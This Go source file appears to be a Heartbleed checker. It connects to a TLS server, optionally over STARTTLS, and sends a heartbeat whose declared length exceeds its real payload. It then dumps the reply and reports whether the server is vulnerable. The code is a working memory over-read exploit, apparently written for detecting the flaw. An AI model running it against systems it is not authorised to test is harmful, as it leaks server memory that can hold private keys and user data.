package heartbleed

import (
	"bytes"
	_ "crypto/sha256"
	_ "crypto/sha512"
	"encoding/binary"
	"errors"
	"github.com/FiloSottile/Heartbleed/tls"
	"github.com/davecgh/go-spew/spew"
	"net"
	"strings"
	"time"
)

type Target struct {
	HostIp  string
	Service string
}

var Safe = errors.New("heartbleed: no response or payload not found")
var Timeout = errors.New("heartbleed: timeout")

var padding = []byte(" YELLOW SUBMARINE ")

// struct {
//    uint8  type;
//    uint16 payload_length;
//    opaque payload[HeartbeatMessage.payload_length];
//    opaque padding[padding_length];
// } HeartbeatMessage;
func buildEvilMessage(payload []byte, host string) []byte {
	buf := bytes.Buffer{}
	err := binary.Write(&buf, binary.BigEndian, uint8(1))
	if err != nil {
		panic(err)
	}
	err = binary.Write(&buf, binary.BigEndian, uint16(len(payload)+40+len(host)))
	if err != nil {
		panic(err)
	}
	_, err = buf.Write(payload)
	if err != nil {
		panic(err)
	}
	_, err = buf.Write(padding)
	if err != nil {
		panic(err)
	}
	_, err = buf.WriteString(host)
	if err != nil {
		panic(err)
	}
	return buf.Bytes()
}

func Heartbleed(tgt *Target, payload []byte, skipVerify bool) (string, error) {
	host := tgt.HostIp
	if strings.Index(host, ":") == -1 {
		host = host + ":443"
	}

	net_conn, err := net.DialTimeout("tcp", host, 3*time.Second)
	if err != nil {
		return "", err
	}
	net_conn.SetDeadline(time.Now().Add(10 * time.Second))

	if tgt.Service != "https" {
		err = DoStartTLS(net_conn, tgt.Service)
		if err != nil {
			return "", err
		}
	}

	hname := strings.Split(host, ":")
	conn := tls.Client(net_conn, &tls.Config{InsecureSkipVerify: skipVerify, ServerName: hname[0]})
	defer conn.Close()

	err = conn.Handshake()
	if err != nil {
		return "", err
	}

	err = conn.SendHeartbeat([]byte(buildEvilMessage(payload, host)))
	if err != nil {
		return "", err
	}

	go func() {
		// Needed to process the incoming heartbeat
		conn.Read(nil)
	}()

	res := make(chan error)
	go func() {
		// TODO: rewrite this, find a better way to detect server being "alive"
		// (<joke>maybe send an heartbeat?</joke>)
		time.Sleep(5 * time.Second)
		_, err := conn.Write([]byte("quit\n"))
		conn.Read(nil)
		res <- err
	}()

	select {
	case data := <-conn.Heartbeats:
		out := spew.Sdump(data)
		if bytes.Index(data, padding) == -1 {
			return "", Safe
		}
		if strings.Index(string(data), host) == -1 {
			return "", errors.New("Please try again")
		}

		// Vulnerable
		return out, nil

	case r := <-res:
		if r != nil {
			return "", r
		}
		return "", Safe

	case <-time.After(8 * time.Second):
		return "", Timeout
	}

}
